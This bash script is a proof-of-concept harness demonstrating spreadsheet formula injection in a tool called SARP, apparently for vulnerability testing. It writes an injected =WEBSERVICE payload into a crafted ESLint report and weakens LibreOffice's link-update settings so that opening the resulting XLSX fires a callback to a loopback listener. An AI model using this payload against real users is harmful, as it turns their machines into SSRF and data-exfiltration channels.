#!/usr/bin/env bash
#
# Detonation harness for the spreadsheet formula injection.
#
# It proves the ceiling: a =WEBSERVICE() formula that SARP wrote into an XLSX
# actually fires an HTTP request when the report is opened, turning the analyst
# host into a request source (SSRF) and a data-exfiltration channel.
#
# Flow:
#   1. start a local listener on 127.0.0.1:9099
#   2. run SARP against a malicious ESLint report whose message is
#        =WEBSERVICE("http://127.0.0.1:9099/leak?src=SARP_XLSX")
#   3. open the XLSX with LibreOffice, forcing recalc-on-load so the volatile
#      WEBSERVICE function evaluates
#   4. report whether the listener received the request
#
# Requires: python3, git, and a working LibreOffice (soffice) that can run
# headless on this host. Bounded and non-destructive: the callback target is
# a loopback listener you control; nothing leaves the machine.

set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK="${HERE}/.work"
PORT=9099

command -v soffice >/dev/null || { echo "soffice (LibreOffice) not found on PATH"; exit 1; }

# Reuse the checkout + venv that run_poc.sh creates; build them if absent.
if [ ! -d "${WORK}/sarp/.git" ] || [ ! -d "${WORK}/venv" ]; then
  echo "Setting up SARP + venv (first run)..."
  bash "${HERE}/run_poc.sh" >/dev/null
fi
# shellcheck disable=SC1091
. "${WORK}/venv/bin/activate"

# 1. Local listener.
cat > "${WORK}/listener.py" <<PY
import http.server, socketserver, time
class H(http.server.BaseHTTPRequestHandler):
    def _hit(self):
        open("${WORK}/HIT.log","a").write("HIT "+self.command+" "+self.path+"\n")
        self.send_response(200); self.send_header("Content-Length","8"); self.end_headers()
        if self.command != "HEAD": self.wfile.write(b"exfil-ok")
    do_GET = _hit
    do_HEAD = _hit
    def log_message(self,*a): pass
with socketserver.TCPServer(("127.0.0.1", ${PORT}), H) as s:
    s.timeout=1; t=time.time()
    while time.time()-t<180: s.handle_request()
PY
rm -f "${WORK}/HIT.log"
python "${WORK}/listener.py" & LPID=$!
sleep 1

# 2. Malicious ESLint report -> SARP -> XLSX.
# WEBSERVICE is an Excel-2013 function, so in OOXML it must be stored as
# _xlfn.WEBSERVICE or the reader shows #NAME?. SARP writes the field verbatim,
# so the attacker simply includes the _xlfn. prefix.
cat > "${WORK}/mal.json" <<JSON
[{"filePath":"app.js","messages":[{"ruleId":"no-unused-vars","severity":2,
  "message":"=_xlfn.WEBSERVICE(\"http://127.0.0.1:${PORT}/leak?src=SARP_XLSX\")","line":1,"column":1}]}]
JSON
( cd "${WORK}/sarp/src" && python parse-cli.py -i eslint "${WORK}/mal.json" \
    -o "${WORK}/evil.xlsx" --format excel --disable-progressbar >/dev/null )

# 3. Force recalc-on-load (OOXMLRecalcMode 0 = Always) and open the report.
PROF="${WORK}/loprofile"; rm -rf "${PROF}"; mkdir -p "${PROF}/user"
cat > "${PROF}/user/registrymodifications.xcu" <<XCU
<?xml version="1.0" encoding="UTF-8"?>
<oor:items xmlns:oor="http://openoffice.org/2001/registry" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
 <item oor:path="/org.openoffice.Office.Calc/Formula/Load"><prop oor:name="OOXMLRecalcMode" oor:op="fuse"><value>0</value></prop></item>
 <item oor:path="/org.openoffice.Office.Calc/Formula/Load"><prop oor:name="ODFRecalcMode" oor:op="fuse"><value>0</value></prop></item>
 <!-- Allow external-link update on load (0=Never,1=OnRequest,2=Always). This is the
      "Update links when opening" control; its default (not Always) is why LibreOffice
      shows "Automatic update of external links has been disabled" and blocks the fetch. -->
 <item oor:path="/org.openoffice.Office.Calc/Content/Update"><prop oor:name="Link" oor:op="fuse"><value>2</value></prop></item>
</oor:items>
XCU
# A plain "soffice --convert-to" is unreliable here: it attaches to any running
# LibreOffice (ignoring this profile), does not perform the external-link update on
# load, and exits before the async WEBSERVICE request completes. So open the file in
# the GUI with a fresh, isolated profile and let the analyst allow the update, which is
# exactly the real-world flow.
echo
echo "Closing any running LibreOffice so the isolated profile is used..."
pkill -9 -f soffice.bin 2>/dev/null || true
sleep 2

echo "Opening ${WORK}/evil.xlsx in LibreOffice (isolated profile)..."
echo "If an infobar says external links are disabled, click Enable Update, then press Ctrl+Shift+F9."
soffice --norestore -env:UserInstallation="file://${PROF}" "${WORK}/evil.xlsx" &
SOFFICE_PID=$!

# 4. Wait for the callback.
echo "Waiting up to 60s for the callback..."
HIT=""
for i in $(seq 1 60); do
  if [ -s "${WORK}/HIT.log" ]; then HIT=1; break; fi
  sleep 1
done
echo
if [ -n "${HIT}" ]; then
  echo "SSRF/exfil CONFIRMED - LibreOffice issued the attacker-directed request:"
  cat "${WORK}/HIT.log"
else
  echo "No callback yet. In the open LibreOffice window: click Enable Update on the"
  echo "infobar, then press Ctrl+Shift+F9 to recalculate. Re-run to poll again, or watch"
  echo "the listener output above."
fi
kill "${LPID}" "${SOFFICE_PID}" 2>/dev/null || true
